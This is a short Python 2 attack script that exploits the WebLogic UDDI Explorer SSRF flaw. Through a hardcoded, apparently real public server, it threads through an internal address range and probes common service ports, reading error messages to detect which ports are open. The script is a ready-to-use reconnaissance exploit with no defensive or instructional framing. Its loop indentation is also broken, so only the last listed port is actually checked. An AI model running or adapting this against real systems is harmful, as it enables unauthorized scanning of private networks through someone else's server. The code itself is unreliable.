#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import sys
import time
import thread
import requests
def scan(ip_str):
    ports = ('21','22','23','53','80','135','139','443','445','1080','1433','1521','3306','3389','4899','8080','7001','8000',)
    #ports = ('80',)
    for port in ports:
        exp_url = "http://210.77.176.129/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
    # print exp_url
    try:
        response = requests.get(exp_url, timeout=15, verify=False)
        #SSRF判断
        re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
        #丢失连接.端口连接不上
        re_sult2 = re.findall('but could not connect',response.content)
        #没有路由
        re_sult3 = re.findall('No route to host',response.content)
        if len(re_sult1)!=0 and len(re_sult2)==0 and len(re_sult3)==0:
            print ip_str+':'+port
    except Exception, e:
        pass
def deffind_ip(ip_prefix):
    '''
    给出当前的192.168.1 ，然后扫描整个段所有地址
    '''
    for i in range(1,256):
        ip = ip_prefix + "."+str(i)
        #print ip
        thread.start_new_thread(scan, (ip,))
        time.sleep(3)

if __name__ == "__main__":
    #commandargs = sys.argv[1:]
    commandargs = "10.2.195"
    args = "".join(commandargs)
    # ip_prefix = '.'.join(args.split('.')[:-1])
    deffind_ip(args)
